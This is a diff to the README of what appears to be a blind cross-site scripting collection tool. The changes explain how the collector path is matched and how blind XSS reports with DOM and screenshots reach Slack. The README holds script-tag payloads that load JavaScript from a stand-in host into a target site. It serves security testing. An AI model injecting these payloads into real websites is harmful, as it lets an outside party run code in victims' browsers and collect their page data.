@@ -38,10 +38,13 @@ Set `"CollectorPath":"examplepath"` in `.wwconfig`
 Set `.js` extension with payload `alert(1)` in `assets/extensions.json`  
 Insert this payload to the website, alert will popup.  
 `<script src=https://domain.com/examplepath.js></script>`  
+This use regex `examplepath.*` so you can use `examplepathanything/after/counts.html`  
 
 ### Collecting data from blind XSS  
+You can use any endpoint for testing blind XSS.  
+Dont use your collector path for blind XSS, as it have priority, so no blind XSS payload will be send.  
 You can find detailed report for your XSS, with DOM and Screenshort.  
-These request will be sent to slack, if specified in config.
+These request will be sent to slack, if specified in config.  
 `<script src=https://domain.com></script>`  
 ![blind xss](screenshots/blindxss.png)  
 
